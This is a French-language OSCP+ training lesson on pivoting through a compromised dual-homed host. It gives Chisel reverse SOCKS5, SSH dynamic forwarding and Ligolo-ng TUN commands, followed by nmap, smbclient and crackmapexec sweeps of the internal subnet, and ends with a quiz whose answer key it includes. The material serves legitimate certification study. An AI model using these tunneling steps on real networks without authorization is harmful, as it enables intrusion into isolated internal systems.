# TOME P7 — Certifications d'Élite & Spécialisations — Jour 304 (6h) : OSCP+ Prep — Pivoting & Tunneling (Chisel SOCKS5, Ligolo-ng TUN Interface, Dynamic Port Forwarding & Double Pivot)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques de **Pivoting et de Tunneling réseau essentielles à l'examen OSCP+** : créer un tunnel SOCKS5 dynamique avec **Chisel** pour pivoter vers des sous-réseaux internes non routés, utiliser **Ligolo-ng** (interface TUN kernel) pour un pivot transparent, et enchaîner les pivots (Double Pivot) pour atteindre un réseau isolé de niveau 3.
>
> **Compétences visées :** `OSCP-07` (A) — Dynamic SOCKS5 Pivot (Chisel / SSH) | `OSCP-08` (A) — Ligolo-ng TUN Interface & Double Pivot

---

## 1) Module — Concepts de Pivoting Réseau OSCP (2h)

### 📖 Narration/Intuition

Dans l'examen OSCP+, les machines cibles sont souvent organisées en **réseaux imbriqués** (ex: le réseau `10.10.10.0/24` n'est accessible que depuis la machine pivot qui a deux interfaces réseau). Pour atteindre le sous-réseau interne, on crée un **tunnel** depuis la machine pivot compromise vers notre Kali, puis on route tout le trafic à travers ce tunnel.

```
[ Kali Attaquant ] ──(VPN HTB/PWK)──► [ Machine Pivot (Double NIC) ]
  10.10.10.100                             10.10.10.50 | 172.16.50.50
                                                        │
                                             [ Réseau Interne Isolé ]
                                               172.16.50.0/24
                                             (DC, Serveurs SQL, etc.)
```

---

## 2) Module — Pivot SOCKS5 avec Chisel (`chisel_pivot.sh`) (2h)

### 🛠️ Atelier Pratique

```bash
# ═══════════════════════════════════════════════════════
# MÉTHODE 1 — Chisel (SOCKS5 sur TCP) : Pivot simple
# ═══════════════════════════════════════════════════════

# Sur la machine Kali (Serveur Chisel)
./chisel server --reverse --port 8080
# ->> Écoute les connexions inverses des clients

# Sur la machine pivot compromise (Client Chisel)
./chisel client 10.10.10.100:8080 R:socks
# ->> Crée un tunnel SOCKS5 inversé sur 127.0.0.1:1080 côté Kali !

# Configurer proxychains pour router via ce SOCKS5
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Utiliser proxychains pour atteindre le réseau interne via le pivot
proxychains nmap -sT -Pn -p 80,443,445,3389 172.16.50.10
proxychains smbclient //172.16.50.10/share -U admin

# ═══════════════════════════════════════════════════════
# MÉTHODE 2 — SSH Dynamic Port Forwarding (natif POSIX)
# ═══════════════════════════════════════════════════════
ssh -D 1080 -N -f user@pivot-machine-ip
# -D 1080 : Crée un proxy SOCKS5 sur le port local 1080
# -N      : Pas de commande distante (tunnel uniquement)
# -f      : Passe en arrière-plan
```

---

## 3) Module — Ligolo-ng (Interface TUN — Pivot Transparent) (2h)

```bash
# ═══════════════════════════════════════════════════════
# LIGOLO-NG : Interface TUN kernel = pivot "natif" sans proxychains !
# ═══════════════════════════════════════════════════════

# Sur Kali : Créer l'interface TUN ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Démarrer le serveur proxy Ligolo-ng
./proxy -selfcert -laddr 0.0.0.0:11601

# Sur la machine pivot (agent Ligolo-ng)
./agent -connect 10.10.10.100:11601 -ignore-cert

# Dans la console Ligolo-ng : démarrer le tunnel
>> session
>> [0] use
>> start

# Ajouter la route vers le réseau interne via l'interface TUN
sudo ip route add 172.16.50.0/24 dev ligolo

# Désormais : nmap, curl, crackmapexec fonctionnent DIRECTEMENT sans proxychains !
nmap -sV -p 445 172.16.50.10
crackmapexec smb 172.16.50.0/24

# ═══════════════════════════════════════════════════════
# DOUBLE PIVOT : Atteindre un 3ème réseau derrière le pivot interne
# ═══════════════════════════════════════════════════════
# Depuis la machine pivot 172.16.50.50, démarrer un 2ème agent Ligolo vers le 3ème réseau
# puis ajouter la route 192.168.100.0/24 dev ligolo sur Kali
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **Pivoting** | Technique de routage du trafic d'attaque à travers une machine compromise pour atteindre des réseaux isolés |
| **SOCKS5** | Protocole de proxy réseau supportant TCP et UDP, largement utilisé pour les tunnels de pivoting |
| **Chisel** | Outil de tunneling TCP/UDP rapide via HTTP basé sur des WebSockets (client/serveur en Go) |
| **Ligolo-ng** | Outil de pivot avancé créant une interface réseau TUN kernel pour un routage natif transparent |
| **Double Pivot** | Enchaînement de deux tunnels de pivoting pour atteindre un réseau de niveau 3 ou plus |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel est l'avantage principal de **Ligolo-ng** par rapport à un tunnel Chisel SOCKS5 + Proxychains dans un contexte OSCP ?
- A) Ligolo-ng crée une interface réseau TUN kernel permettant d'utiliser tous les outils (nmap, crackmapexec, impacket) directement sans passer par proxychains, avec des performances réseau natives
- B) Ligolo-ng est plus rapide à installer
- C) Ligolo-ng fonctionne sans agent sur la machine cible
- D) Ligolo-ng intègre un reverse shell automatique

**Réponse : A**

**Q2 :** Quelle option SSH permet de créer un proxy SOCKS5 dynamique local utilisable avec Proxychains pour pivoter vers un réseau interne ?
- A) `ssh -D <port_local> -N -f user@pivot`
- B) `ssh -L 8080:localhost:80`
- C) `ssh -R 443:localhost:443`
- D) `ssh -X user@pivot`

**Réponse : A**

**Q3 :** Dans un scénario OSCP de Double Pivot, pourquoi est-il nécessaire d'enchaîner deux tunnels ?
- A) Parce que le troisième réseau cible est uniquement accessible depuis le deuxième réseau interne, et non directement depuis la machine de l'attaquant
- B) Pour augmenter la bande passante
- C) Pour contourner le HTTPS
- D) Pour masquer l'adresse MAC

**Réponse : A**

**Q4 :** Quel fichier de configuration doit être modifié sur Kali pour que `proxychains` route le trafic à travers le tunnel SOCKS5 Chisel sur le port 1080 ?
- A) `/etc/proxychains4.conf` (ajouter `socks5 127.0.0.1 1080`)
- B) `/etc/hosts`
- C) `/etc/resolv.conf`
- D) `/etc/iptables.conf`

**Réponse : A**

**Q5 :** Pourquoi l'option `--reverse` du serveur Chisel est-elle préférable dans un environnement fortement filtré par des règles de pare-feu sortantes ?
- A) Parce qu'elle permet à l'agent (machine pivot) d'initier la connexion vers le serveur Chisel (Kali), contournant les règles de pare-feu qui bloquent les connexions entrantes vers la machine pivot
- B) Parce qu'elle chiffre le tunnel avec AES-256
- C) Parce qu'elle crée une interface réseau virtuelle
- D) Parce qu'elle supporte IPv6 uniquement

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
